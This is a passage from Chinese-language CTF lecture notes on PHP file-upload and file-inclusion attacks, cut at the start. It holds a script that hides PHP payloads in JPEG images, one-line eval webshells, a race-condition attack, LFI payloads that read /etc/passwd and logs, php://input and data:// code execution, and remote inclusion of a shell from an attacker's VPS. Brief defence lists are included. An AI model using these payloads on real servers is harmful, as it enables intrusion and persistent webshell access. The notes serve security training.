class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>羽师傅的处理脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>1、先上传JPG图片，然后下载至本地保存为1.jpg</p>
<p>2、插入php代码，用脚本处理1.jpg</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">php jpg_payload.php <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>
<p>3、上传图片马；将生成的 payload_1.jpg上传。</p>
<p>4、验证；将上传的图片再次下载到本地。</p>
<p>可以看到，php代码没有被去除，证明我们成功上传了含有php代码的jpg图片。</p>
<p>注意：有一些jpg图片不能被处理，所以要多尝试一些jpg图片。</p>
<h3 id="文件幻数检测（文件开头）"><a href="#文件幻数检测（文件开头）" class="headerlink" title="文件幻数检测（文件开头）"></a>文件幻数检测（文件开头）</h3><blockquote>
<p>幻数 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p>
</blockquote>
<p>要绕过文件幻数检测就要在文件开头写上如下的值</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.jpg	FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">.gif	47 49 46 38 39 61</span><br><span class="line">.png	89 50 4E 47</span><br></pre></td></tr></table></figure>
<p>在文件幻数后面加上自己的WebShell代码就行（常见的是<code>GIF89a</code>）</p>
<p>图像文件相关信息检测常用的是<code>getimagesize()</code>函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p>
<p><img src="C:/Users/13611/Desktop/nep冬令营/讲课/深入一些吧.assets/image-20210208225003833.png" alt="image-20210208225003833"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>
<h3 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h3><p><code>如upload-labs第十七关</code></p>
<p>一些网站允许上传任意文件，然后检测文件是否包含Webshell，如果有则删除该文件。</p>
<blockquote>
<p>服务器端在处理不同用户的请求时是并发进行的</p>
<p>如果并发处理不当或相关操作逻辑顺序设计的不合理时，将导致条件竞争漏洞</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))&#123;</span><br><span class="line">		copy(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;dst&#x27;</span>]);</span><br><span class="line">      sleep(<span class="number">2</span>);<span class="comment">//检查操作</span></span><br><span class="line">		unlink(<span class="variable">$_GET</span>[<span class="string">&#x27;dst&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>它先把文件保存在本地，再检查，然后删除</p>
<p>在上传完成和安全检查删除它的间隙，攻击者用多线程不断的发起访问请求该文件</p>
<p>该文件就会被执行从而生成一个恶意shell</p>
<p><strong>竞争删除前生成shell流程：</strong></p>
<blockquote>
<p>上传文件→访问执行文件，生成shell文件→删除不安全文件     (多线程访问)</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h3><p>在php执行的过程中，除了主 <code>php.ini</code> 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 <code>.user.ini</code> 中可以定义除了PHP_INI_SYSTEM以外的模式的选项，故可以使用 <code>.user.ini</code> 加上非php后缀的文件构造一个shell，比如 <code>auto_prepend_file=01.gif</code> </p>
<ul>
<li>需要当前上传的目录下有php文件</li>
</ul>
<p><a href="https://www.cnblogs.com/sijidou/p/13121301.html">.user.ini导致文件上传绕过</a></p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><blockquote>
<ul>
<li>文件扩展名服务端白名单效验</li>
<li>文件内容服务端效验  &lt;? php </li>
<li>上传文件重命名</li>
<li>隐藏上传文件路径</li>
<li>限制相关目录的执行权限，防范WebShell攻击</li>
</ul>
</blockquote>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><blockquote>
<p>程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。</p>
<p>但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞</p>
</blockquote>
<h3 id="demo实验"><a href="#demo实验" class="headerlink" title="demo实验"></a>demo实验</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>()		<span class="comment">//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span></span><br><span class="line">    <span class="comment">//warning</span></span><br><span class="line"><span class="keyword">include_once</span>()	<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>()		<span class="comment">//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。</span></span><br><span class="line"><span class="keyword">require_once</span>()	<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br></pre></td></tr></table></figure>
<h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><blockquote>
<p>用户可以控制包含的文件名，从而造成信息泄露和getshell</p>
</blockquote>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.读敏感文件</span><br><span class="line">?file&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">2.利用封装协议读源码</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php	#这样能看到php文件的源码</span><br><span class="line"></span><br><span class="line">4.包含日志文件getshell</span><br><span class="line">路径</span><br><span class="line">apache:&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</span><br><span class="line">nginx:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line"></span><br><span class="line">3.包含图片Getshell</span><br><span class="line">在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码</span><br><span class="line"></span><br><span class="line">5.session文件包含getshell</span><br></pre></td></tr></table></figure>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>CTFSHOW-web80-81</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure>
<h4 id="照片木马的制作"><a href="#照片木马的制作" class="headerlink" title="照片木马的制作"></a>照片木马的制作</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行命令copy 1.png&#x2F;b + 1.php&#x2F;a 2.jpg </span><br><span class="line">前两个文件合并成一个文件，文件属性为2.jpg</span><br></pre></td></tr></table></figure>
<h3 id="PHP中的封装协议-伪协议"><a href="#PHP中的封装协议-伪协议" class="headerlink" title="PHP中的封装协议(伪协议)"></a>PHP中的封装协议(伪协议)</h3><h4 id="file"><a href="#file" class="headerlink" title="file://"></a><strong>file://</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用于访问本地文件系统，在CTF中通常用来读取本地文件,且不受allow_url_fopen与allow_url_include的影响。</span><br><span class="line">include()&#x2F;require()&#x2F;include_once()&#x2F;require_once()参数可控的情况下</span><br></pre></td></tr></table></figure>
<h4 id="php"><a href="#php" class="headerlink" title="php://"></a><strong>php://</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_fopen:off&#x2F;on</span><br><span class="line">allow_url_include : 部分需要on (下面列出)</span><br><span class="line">php:&#x2F;&#x2F;input  #用的比较多 输入流</span><br></pre></td></tr></table></figure>
<h5 id="作用："><a href="#作用：" class="headerlink" title="作用："></a><strong>作用：</strong></h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是 php://filter 和 php://input</span></span><br><span class="line">php:<span class="comment">//filter用于读取源码，php://input用于执行php代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1. php://filter/read=convert.base64-encode/resource=[文件名]  //读取文件源码</span></span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=phpinfo.php</span><br><span class="line"><span class="comment">#ctfshow web78</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.php://input + [POST DATA]执行php代码</span></span><br><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分] &lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.若有写入权限，[POST DATA部分] 写入一句话木马</span></span><br><span class="line">&lt;?php fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><h5 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">allow_url_fopen:on</span><br><span class="line"></span><br><span class="line">allow_url_include :on</span><br><span class="line">#ctfshow web79</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs &#x3D;&#x3D;&#x3D;&gt;   &lt;?php system(&#39;cat flag.php&#39;);</span><br></pre></td></tr></table></figure>
<p><strong>作用</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">自PHP&gt;=<span class="number">5.2</span>.<span class="number">0</span>起，可以使用 data:<span class="comment">// 数据流封装器，以传递相应格式的数据。</span></span><br><span class="line">通常可以用来执行PHP代码</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.data://text/plain,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.data://text/plain;base64,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure>
<h3 id="远程文件包含-RFL"><a href="#远程文件包含-RFL" class="headerlink" title="远程文件包含(RFL)"></a>远程文件包含(RFL)</h3><blockquote>
<p>服务器通过 PHP 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，</p>
<p>从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。</p>
</blockquote>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>条件：</strong><code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。</p>
<p><strong>1、远程包含Webshell</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?arg=http://攻击者的VPS/shell.txt</span><br><span class="line"><span class="comment">#会在网站目录生成名为 shell.php 的一句话木马</span></span><br></pre></td></tr></table></figure>
<p><strong>shell.txt内容为：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><h5 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h5><p>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.%2562ase64-encode&#x2F;resource</span><br></pre></td></tr></table></figure>
<h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><strong>%00截断</strong></h5><p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="文件包含getshell"><a href="#文件包含getshell" class="headerlink" title="文件包含getshell"></a>文件包含getshell</h5><p><a href="https://xz.aliyun.com/t/5535#toc-2">浅析php文件包含及其getshell的姿势</a></p>
<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><ol>
<li>禁止远程文件包含 <code>allow_url_include=off</code></li>
<li>配置 <code>open_basedir=指定目录</code>，限制访问区域。</li>
<li>过滤<code>../</code>等特殊符号</li>
<li>修改Apache日志文件的存放地址</li>
<li>开启魔术引号 <code>magic_quotes_qpc=on  php 4 5</code> </li>
<li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li>
</ol>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>文件上传经常和文件包含一起考察。  如：ctfshow web164</p>
<ul>
<li><p>判断是黑名单还是白名单</p>
</li>
<li><p>白名单解析漏洞绕过，配合文件包含 照片二次渲染等等</p>
</li>
<li><p>黑名单扩展名绕过或.htaccess,.user.ini等绕过总结</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include() url</span><br><span class="line">file_get_concent()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="解析漏洞攻击"><a href="#解析漏洞攻击" class="headerlink" title="解析漏洞攻击"></a>解析漏洞攻击</h3><p>主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。</p>
<h4 id="zip-amp-bzip2-amp-zlib"><a href="#zip-amp-bzip2-amp-zlib" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://"></a><strong>zip:// &amp; bzip2:// &amp; zlib://</strong></h4><p><strong>作用：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">zip:<span class="comment">// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件</span></span><br><span class="line"></span><br><span class="line">更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等</span><br></pre></td></tr></table></figure>
<h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容</span><br><span class="line">#经常使用于序列化</span><br></pre></td></tr></table></figure>
